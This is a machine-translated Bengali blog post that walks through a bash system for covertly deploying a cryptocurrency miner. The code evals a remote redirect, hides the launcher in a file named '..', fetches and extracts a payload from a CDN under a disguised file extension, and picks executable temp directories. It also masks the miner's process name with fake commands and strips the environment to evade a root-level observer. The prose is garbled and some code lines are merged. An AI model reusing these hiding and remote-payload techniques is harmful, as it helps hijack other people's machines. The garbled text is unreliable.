ইউআরএল পরিবর্তন করে আমাদের লঞ্চারকে প্যারামেট্রাইজ করতে পারি, সর্বদা কোডের উদ্ধৃতি এবং পালানোর দিকে মনোযোগ দিয়ে<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>উইজেট<code>-S</code> বিশ্লেষণের জন্য আমরা পুন redনির্দেশিত url প্রিন্ট করি। প্যারামিটার এবং স্ক্রিপ্ট থাকার কারণে, আমরা একটি ফাইলের উপর লেখা ভেরিয়েবলগুলি মূল্যায়ন করি<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>এই ফাইলটি স্থাপন করা স্ক্রিপ্ট দ্বারা উত্সারিত হবে। স্টার্টআপ স্ক্রিপ্টের শেষ অংশটি প্রকৃত<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> ট্রাম্পোলিন</a> , বর্তমান শেল প্রক্রিয়ার মধ্যে স্ক্রিপ্টটি মূল্যায়ন করুন, অথবা সম্ভব হলে এটি tmux দ্বারা পরিচালিত হতে দিন।<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>লঞ্চার স্ক্রিপ্টটি ".." নামে একটি ফাইলে ফেলে দেওয়া হয় এটি বিভ্রান্তিকর দেখায় কারণ এটি একটি হিসাবে ভুল হতে পারে<em> পিতামাতা</em> ডিরেক্টরি। এবং আমরা সেশন কমান্ডটি অন্তর্ভুক্ত করি না, যেহেতু এটি প্রক্রিয়া কমান্ডের মধ্যে স্থায়ী হয়, পরিবর্তে আমরা tmux সেশনটি আগে থেকেই শুরু করি এবং tmux টার্মিনাল ইন্টারফেসের মাধ্যমে সোর্স কমান্ড পাঠাই। এই সম্পর্কিত, কখনও কখনও সঙ্গে একটি এক্সিকিউটেবল কল<code>./</code> কমান্ডে সেই অক্ষরগুলি রাখে, তাই এটি যোগ করা ভাল<code>$PWD</code> পথের দিকে ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> পেলোড</a></h2><p>আমাদের স্থাপনার স্ক্রিপ্ট শুরু হয়<code>env.sh</code> ফাইল, এবং হিসাবে রাখা বা কনফিগার করা vars<code>STARTING_*</code> মত পছন্দ করে<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>এটি আমাদের পরিবেশ পুনরায় সেট করার সময় একটি চলমান উদাহরণকে হত্যা এবং পুনরায় চালু করতে দেয়। এক্সিকিউটিভ ক্ষমতা সহ একটি টিএমপি ডিরেক্টরিতে স্যুইচ করা যাক<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>ক এর মধ্যে আছে কিনা তা পরীক্ষা করা হচ্ছে<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> ধারক</a> এটিও সহজ, আমরা ইঙ্গিতগুলির জন্য ফাইল সিস্টেমটি পরীক্ষা করতে পারি<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>এখন আমাদের পেলোড ডাউনলোড করার সময়, আমরা উইজেট এবং কার্ল উভয়কেই সমর্থন করা বেছে নিয়েছি, আমরা ইতিমধ্যে জানি কিভাবে সাবধানে পতাকা দিয়ে উইজেট ব্যবহার করতে হয়, কার্লের জন্য এটি একটু ভিন্ন। আমাদের একটি কনফিগ ফাইল তৈরি করতে হবে, এবং ওভাররাইড করতে হবে<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>শেষ ধাপ হল শুধু পেলোড বের করা<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>পেলোড সার্ভিসিংয়ের জন্য [CDN] এর ব্যবহার উল্লেখ করার মতো। এখানে আবার উদ্ধার করার জন্য ক্লাউডফ্লেয়ার আমাদের ব্যান্ডউইথ ব্যয়ের হাত থেকে বাঁচায়। আমাদের সংকুচিত পেলোডের নাম পরিবর্তন করে কেবল a দিয়ে<em> ফাইল এক্সটেনশন</em> ক্লাউডফ্লেয়ার দ্বারা সমর্থিত ... এটি ক্যাশে হয়ে যায়। ক্লাউডফ্লেয়ার সার্ভিসিং এর শিরোনাম যাচাই করে না, কারণ এই স্কেলে এটি করা কেবল অবাস্তব।<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> ব্যাশল্যান্ডের নিচে অ্যাডভেঞ্চার</a></h2><p>ব্যাশকে পোর্টেবল বলে ধরে নেওয়া হয়েছিল, জায়গা থেকে খুব বেশি দেখায় না এবং পার্ল, রুবি বা পাইথনের অন্যান্য স্ক্রিপ্টিং ভাষার তুলনায় এটি সর্বব্যাপী। সত্য হল যে গোলং বা লুয়ায় লেখা একটি স্বতন্ত্র বাইনারি অনেক কম, বাগ সহ এবং বজায় রাখা সহজ ছিল, মূলত বাশ আমার পক্ষে সবচেয়ে খারাপ পছন্দ ছিল, যতক্ষণ না আমি ব্যাশ দিয়ে এত চুলকানি করেছিলাম , পুনর্লিখনের জন্য খুব দেরি হয়ে গিয়েছিল, এবং এটি এক ধরণের বিরক্তিকরও হয়ে উঠছিল।<p>কম্পাইল টাইম ফ্ল্যাগের সাথে ব্যস্তবাক্স ব্যবহার করার বিকল্পটিও ছিল সব বিল্টিন (যেমন grep এবং sed) ব্যবহার করার জন্য, তবে বিল্টইন ব্যবহার করে এইভাবে চাকরি (কাঁটাচামচ) তৈরি করতে দেয় না এবং ডেমনকে সম্ভাব্য ডেডলকগুলিতে প্রকাশ করে।<p>আমি এখানে কিছু ব্যাশ ফাংশন বর্ণনা করব, সম্পূর্ণ তালিকা উপলব্ধ<a href=\assets/posts/bash_functions.txt> এখানে</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>ব্যবহার<code>RANDOM</code> একটি অক্ষর কোডের সাথে সম্পর্কিত 97-122 এর মধ্যে একটি সংখ্যা পেতে ভেরিয়েবল, printf একটি বিল্টইন হওয়া উচিত, আমরা একটি লুপের মধ্যে কাঁটাচামচ করতে চাই না।<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>বেনামী ফাইল বর্ণনাকারী তৈরির জন্য পাইপগুলি লিভারেজ করুন, এগুলি ঠিক ফাইল বর্ণনাকারীদের মতো আচরণ করে না কিন্তু সেগুলি যথেষ্ট ভাল<a href=https://en.wikipedia.org/wiki/Inter-process_communication> আইপিসি</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>ফর্ক না করে ঘুমানো, রিড বিল্টিনের টাইমআউট কার্যকারিতা অপব্যবহার করে, এটি একটি ডেডিকেটেড ফাইল ডিসক্রিপ্টর ব্যবহার করে এবং আমাদের নিশ্চিত করতে হবে যে এটি বন্ধ করা এড়ানোর জন্য উপলব্ধ।<p>মত ফাংশন আছে<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> সিস্টেম ব্যবহার পর্যবেক্ষণ করতে ব্যবহৃত হয়, এই সব লিনাক্স ব্যবহার করে<code>/proc</code> যেমন সরঞ্জাম ছাড়া ফাইল<code>ps</code> , তাই কোন forking, সব বিশুদ্ধ bash।<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>বাশ থেকে কোপ্রোসেস পাওয়া যায়<code>v4</code> , তারা চাকরির মতো তাদের নাম এবং তাদের নিজস্ব ফাইল বর্ণনাকারী ছাড়া।<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>আমরা একটি ডেমন লিখছি, যা একটি দীর্ঘস্থায়ী প্রক্রিয়া, এবং আমরা অনেক ফাইল বর্ণনাকারী ব্যবহার করছি, আমরা আসলে কিছু পরিচ্ছন্নতা করতে চাই যাতে এটি না ঘটে<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>এই ফাংশন নির্ভর করে<a href=https://ipinfo.io/> আইপিনফো</a> কর্মীর অঞ্চল নির্ধারণ করতে, যা কিছু অঞ্চল নির্ভর যুক্তিকে সুর করতে দেয়,<a href=\assets/posts/geoip.json> geoip.json</a> দেশগুলিকে অঞ্চলভুক্ত করে, যেহেতু আমরা শীর্ষ স্তরের অঞ্চল চাই, এবং নির্দিষ্ট দেশে আগ্রহী নই।<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>বাশ টিসিপি সংযোগের জন্য সমর্থন, একটি বিমূর্ততা থাকার দ্বারা<code>/dev/tcp</code> (ইউডিপির জন্যও, তবে বেশিরভাগই এটি সাধারণত নির্মাণের সময় অক্ষম বলে মনে হয়, তাই আপনি এটির উপর নির্ভর করতে পারবেন না)। এই ফাইলগুলি একটি বাশ জিনিস, এগুলি লিনাক্সের অংশ নয়<code>/dev</code> গাছ<p>বাশ চাকরির মধ্যে সমঝোতা পরিচালনা করার জন্য একটি লকিং সিস্টেমও উল্লেখ করার মতো। একাধিক কাজকে তালা দিয়ে কাজ করার অনুমতি দেওয়ার জন্য তাদের সকলের একটি ফাইল বর্ণনাকারী ভাগ করা দরকার, তাই আমাদের<code>locker</code> যা একটি চাকরিও, লক ব্যবহার করতে ইচ্ছুক অন্যান্য চাকরির আগে শুরু করতে হবে। লকারটি কেবল পড়ে আছে<code>stdin</code> লক করার অনুরোধের জন্য অপেক্ষা করা, সাড়া দেওয়া<code>stdout</code> একটি পরিবর্তনশীল সঞ্চিত বর্তমান বুলিয়ান অবস্থা উপর নির্ভর করে। আমি গ্যারান্টি দিচ্ছি না যে এই পদ্ধতিটি জাতি মুক্ত, কিন্তু অন্যদিকে, শালীনভাবে কাজ করে বলে মনে হচ্ছে, অন্যদিকে, আমি ফাইল বর্ণনাকারীদের খুব নির্ভরযোগ্য না বলে খুঁজে পেয়েছি, কারণ আমি সন্দেহ করি যে কিছু বাফার আছে যা কোথাও নিচে ফ্লাশ হয় না<em> পাইপ</em> এবং অবশেষে ডেডলক মারছে (যার অর্থ হল আপনি লকারের উপর নির্ভর করতে পারবেন না যা আপনাকে সব সময় উত্তর দেবে)।<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>আপনার আবর্জনা পরিষ্কার করুন ... জটিল ব্যাশ প্রোগ্রামগুলি অনেকগুলি ভেরিয়েবল ব্যবহার করে শেষ হয় এবং যদি আপনি বিশ্বব্যাপী স্থানকে অপব্যবহার করেন তবে এটি ফুলে যায়। আপনি যদি শেল জবস তৈরি করেন, তারা সমস্ত পরিবেশের উত্তরাধিকারী হয় (যা কার্যকরভাবে নকল করা হয়, ভাগ করা হয় না), আপনি দ্রুত বাশ খাওয়া শেষ করতে পারেন<code>100M</code> স্মৃতিশক্তি, সুন্দর না। এছাড়াও আমরা সত্যিই লো প্রোফাইল হতে চাই। আমাদের স্থাপনার দৃশ্যে, প্রতিপক্ষ<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> সম্ভাব্য রুট অ্যাক্সেস এবং আমাদের প্রক্রিয়া সম্পর্কে সম্পূর্ণ তথ্য থাকতে পারে<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , এবং আপনি জানেন ... প্রতিটি প্রক্রিয়া সম্পূর্ণ কমান্ড যা এটি শুরু করেছে এবং রপ্তানি করা পরিবেশের ভেরিয়েবল সম্পর্কে তথ্য ধারণ করে।<h2 id=configuration><a class=header-anchor href=#configuration> কনফিগারেশন</a></h2><p>একবার আমাদের পরিবেশ, এবং আমাদের সরঞ্জামগুলি, আমাদের মেশিনটি যে মেশিনে চলছে তার জন্য আমাদের মাইনারকে টিউন করতে হবে, ছদ্ম কোডে কনফিগারেশন ধাপগুলি:<ul><li><p>খনির জন্য প্রক্রিয়া নাম<li><p>হোস্ট তথ্য (র্যাম/কোর/ক্যাশে/<code>ENV_VARS</code>)<li><p>কনফিগারেশন সংস্করণ<li><p><code>worker_id</code> খনির জন্য (আইপি এবং হোস্ট থেকে)<li><p>সংযোগের জন্য আইপি/পোর্ট</ul><p>প্রক্রিয়াটির জন্য একটি নাম নির্বাচন করা প্রয়োজন<em> লুকান</em> সত্য যে আমরা একটি খনি চালাচ্ছি, কিন্তু আমরা শুধু আমাদের বাইনারি নামকরণ করছি না, আমাদের একটি তালিকা আছে<strong> মুখোশ</strong> সম্ভাব্য প্রার্থীদের জন্য (একটি সাধারণ পাঠ্য ফাইল যেখানে প্রতিটি লাইন একটি মুখোশ):<ul><li><p>এলোমেলোভাবে একটি মাস্ক বাছুন<li><p>একটি ভিন্ন প্রক্রিয়ার কমান্ড পেতে স্ট্রিংয়ের লেজের উপাদানগুলি (প্রথমটি বাদে সব) এলোমেলো করুন। এখন আমাদের মত একটি স্ট্রিং আছে<code>cmd --arg2 --arg1 --arg3</code> । এটি আমাদের মাইনার মাস্ক, আমরা বাইনারি চালাই<em> ছাড়া</em> আর্গুমেন্ট, কিন্তু মনে হচ্ছে আমরা একটি কমান্ড শুরু করেছি<code>cmd</code> যুক্তি সহ<code>--arg1 --arg2 --arg3</code> । ফাইলের নামগুলিতে স্পেস এবং ড্যাশগুলি অনুমোদিত, তাই এটির মতো একটি বাইনারি চালানো ঠিক আছে, প্রক্রিয়া কমান্ডগুলি সংরক্ষণ করার সময় এটি এক্সিকিউটেবল এবং আর্গুমেন্টগুলির মধ্যে লিনাক্স পার্থক্য বলে মনে হয় না।<p>মাইনার কনফিগারেশন থেকে স্বয়ংক্রিয়ভাবে লোড হয়<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> 